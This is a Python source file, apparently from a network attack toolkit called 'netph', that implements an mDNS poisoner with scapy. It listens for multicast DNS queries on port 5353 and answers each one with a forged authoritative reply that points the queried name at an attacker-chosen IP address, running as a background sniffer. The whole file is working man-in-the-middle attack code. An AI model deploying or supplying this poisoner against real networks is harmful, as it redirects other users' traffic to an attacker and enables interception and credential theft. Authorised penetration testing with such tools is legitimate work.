from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from netph.utils.logger import logger
import threading

class MDNSPoisoner:
    def __init__(self, interface: str, spoof_ip: str):
        self.interface = interface
        self.spoof_ip = spoof_ip
        self.running = False
        self._thread = None

    def _handle_packet(self, packet: Packet):
        if packet.haslayer(UDP) and packet[UDP].dport == 5353:
            if packet.haslayer(DNS) and packet[DNS].qr == 0:  # Query
                query_name = packet[DNSQR].qname.decode().rstrip('.')
                logger.info(f"[mDNS] Received query for: {query_name} from {packet[IP].src}")
                
                # Craft response
                resp = IP(dst="224.0.0.251", src=self.spoof_ip) / \
                       UDP(dport=5353, sport=5353) / \
                       DNS(id=0, qr=1, aa=1, rd=0, ra=0, z=0, rcode=0,
                           qd=packet[DNS].qd,
                           an=DNSRR(rrname=packet[DNSQR].qname, type='A', rclass='IN', ttl=120, rdata=self.spoof_ip))
                
                send(resp, iface=self.interface, verbose=False)
                logger.info(f"[mDNS] Sent spoofed response for {query_name} to 224.0.0.251")

    def start(self):
        self.running = True
        logger.info(f"[mDNS] Starting poisoner on {self.interface}...")
        self._thread = threading.Thread(target=self._run)
        self._thread.daemon = True
        self._thread.start()

    def _run(self):
        sniff(iface=self.interface, filter="udp port 5353", prn=self._handle_packet, store=0, stop_filter=lambda x: not self.running)

    def stop(self):
        self.running = False
        if self._thread:
            self._thread.join()
        logger.info("[mDNS] Stopped poisoner.")
